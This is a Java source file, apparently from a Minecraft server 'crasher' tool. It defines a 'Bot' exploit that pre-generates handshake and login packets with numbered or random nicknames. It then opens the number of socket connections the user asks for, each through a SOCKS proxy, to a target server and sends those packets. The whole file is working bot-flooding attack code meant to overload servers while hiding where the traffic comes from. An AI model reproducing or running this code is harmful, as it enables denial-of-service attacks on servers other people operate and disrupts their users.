package uwu.narumi.crasher.core.exploit;

import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;
import uwu.narumi.crasher.api.exception.ExploitException;
import uwu.narumi.crasher.api.exploit.Exploit;
import uwu.narumi.crasher.api.exploit.ExploitInfo;
import uwu.narumi.crasher.api.exploit.argument.Argument;
import uwu.narumi.crasher.api.helper.AddressHelper.McAddress;
import uwu.narumi.crasher.api.helper.PacketHelper;
import uwu.narumi.crasher.api.helper.ProtocolHelper;
import uwu.narumi.crasher.api.helper.ProxyHelper;
import uwu.narumi.crasher.api.helper.StringHelper;
import uwu.narumi.crasher.api.io.NetOut;
import uwu.narumi.crasher.api.optimizer.Optimizer;
import uwu.narumi.crasher.api.packet.Packet;

@ExploitInfo(
    name = "Bot",
    description = "Simple minecraft bots",
    usage = "exploit bot <address> <amount> <nick/random>"
)
public class Bot extends Exploit {

  private final List<Packet[]> packets = new ArrayList<>();

  public Bot() {
    super(
        new Argument("version", 0, String.class),
        new Argument("address", 1, McAddress.class),
        new Argument("amount", 2, Integer.class),
        new Argument("nick", 3, String.class)
    );
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    McAddress address = (McAddress) args[1];
    int amount = (int) args[2];
    int protocol = ProtocolHelper.getProtocol(args[0]);

    index.set(0);
    preGenerate((String) args[3], amount, address.getIp(), address.getPort(), protocol);

    Optimizer.startOptimizing(Auth.class);
    Optimizer.setStopAction(packets::clear);
    for (int i = 0; i < amount; i++) {
      int finalI = i;
      Optimizer.post(() -> {
        try {
          Proxy proxy = ProxyHelper.getSocks();
          Socket socket = ProxyHelper.createSocket(proxy);
          if (socket == null)
            throw new ThreadDeath();

          socket.connect(new InetSocketAddress(address.getIp(), address.getPort()));
          NetOut netOut = new NetOut(socket.getOutputStream());
          for (Packet packet : packets.get(finalI)) {
            packet.send(netOut);
          }

          Optimizer.update();
          System.out.println(String.format(" %s -> %s | %s/%s", proxy, address.toString(), index.getAndIncrement(), amount));
        } catch (Exception ignored) {
        }
      });
    }
  }

  private void preGenerate(String nick, int amount, String ip, int port, int protocol) {
    System.out.println("Pre generating packets");
    for (int i = 0; i < amount; i++) {
      packets.add(new Packet[]{
          PacketHelper.createHandshake(protocol, ip, (short) port, 2),
          PacketHelper.createLoginStart(!nick.equalsIgnoreCase("random") ? nick + i : StringHelper.getRandomString(ThreadLocalRandom.current().nextInt(10) + 3))
      });
    }
    System.out.println("Generated packets");
  }
}
